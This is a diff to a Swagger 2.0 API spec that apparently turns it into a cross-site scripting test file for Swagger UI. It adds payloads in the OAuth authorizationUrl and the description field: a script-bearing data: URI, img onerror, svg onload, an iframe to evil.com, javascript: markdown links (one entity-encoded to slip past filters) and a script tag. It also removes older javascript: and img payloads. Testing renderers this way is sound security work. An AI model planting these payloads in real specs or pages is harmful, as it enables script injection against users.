@@ -1,15 +1,33 @@
 swagger: '2.0'
 securityDefinitions:
-  a:
+  test:
     type: oauth2
-    authorizationUrl: javascript:alert(document.domain)//
+    authorizationUrl: "data:text/html,<script>alert('OAuth XSS')</script>"
 info:
   version: "1.0.0"
-  title: XSS img test
-  description: <img src=https://academy.avast.com/hubfs/New_Avast_Academy/Hackers/Hacker-Hero-a1.png onclick="alert(2)" onerror="alert(3)">
+  title: "Swagger XSS Test"
+  description: |
+    **Image Test:**  
+    <img src=x onerror=alert('IMG XSS')>  
+
+    **SVG XSS:**  
+    <svg/onload=alert('SVG XSS')>  
+
+    **Iframe Injection:**  
+    <iframe src="https://evil.com/xss.html"></iframe>  
+
+    **Markdown Link XSS:**  
+    [Click me](javascript:alert('Markdown XSS'))  
+
+    **Unicode Encoded JavaScript URL:**  
+    [Bypass](&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('Unicode XSS'))  
+
+    **Script Injection:**  
+    <script>alert('Script XSS')</script>  
+
 paths:
-  /accountId/1:
+  /test:
     get:
       responses:
         200:
-          description: Successful response
+          description: "Test if Swagger UI executes any payloads."
